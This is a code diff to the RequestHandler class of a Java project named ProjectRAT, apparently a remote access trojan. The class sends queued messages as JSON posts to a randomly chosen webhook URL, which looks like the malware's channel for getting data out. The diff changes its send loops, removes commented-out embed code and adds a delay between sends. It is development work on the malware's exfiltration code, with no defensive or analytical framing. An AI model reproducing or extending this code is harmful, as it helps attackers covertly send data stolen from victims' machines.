@@ -25,7 +25,7 @@ public class RequestHandler {
         String[] w = ProjectRAT.webhook;
 
         new Thread(() -> {
-            while (true) {
+            while (!queue.isEmpty()) {
                 try {
                     int randomInt = new Random().nextInt(w.length);
                     if(queue.isEmpty())
@@ -39,18 +39,6 @@ public class RequestHandler {
                     if(item.getMessage() != null) {
                         HttpPost request = new HttpPost(w[randomInt]);
                         JSONObject json = new JSONObject();
-
-                        /*JSONArray embeds = new JSONArray();
-                        JSONObject embed = new JSONObject();
-                        JSONArray field = new JSONArray();
-                        JSONObject x = new JSONObject();
-                        x.put("name",item.getClass().getSimpleName());
-                        x.put("value",item.getMessage());
-                        field.add(x);
-                        embed.put("fields",field);
-                        embeds.add(embed);
-                        json.put("embeds",embeds);*/
-
                         json.put("title",item.getClass().getSimpleName());
                         json.put("content",String.format("```%s```",item.getMessage()));
                         StringEntity options = new StringEntity(json.toJSONString(), ContentType.APPLICATION_JSON);
@@ -72,19 +60,6 @@ public class RequestHandler {
                             System.out.println(response);
                         }
                     }
-
-                    /*Object i = stringQueue.poll();
-                    if(i instanceof  String){
-                        HttpPost request = new HttpPost(ProjectRAT.webhook);
-                        JSONObject json = new JSONObject();
-
-                        json.put("title",item.getClass().getSimpleName());
-                        json.put("content",String.format("```%s```",item.getMessage()));
-                        StringEntity options = new StringEntity(json.toJSONString(), ContentType.APPLICATION_JSON);
-                        request.setEntity(options);
-                        HttpResponse response = client.execute(request);
-                        System.out.println(response);
-                    }*/
                     client.close();
 
                 }catch (Exception e) {
@@ -94,10 +69,11 @@ public class RequestHandler {
         }).start();
 
         new Thread(() -> {
-            while (true) {
+            while (!stringQueue.isEmpty()) {
                 try {
                     int randomInt = new Random().nextInt(w.length);
                     Object queueItem = stringQueue.poll();
+                    Thread.sleep(2000);
                     CloseableHttpClient client = HttpClientBuilder.create().build();
                     if (queueItem instanceof String) {
                         HttpPost request = new HttpPost(w[randomInt]);
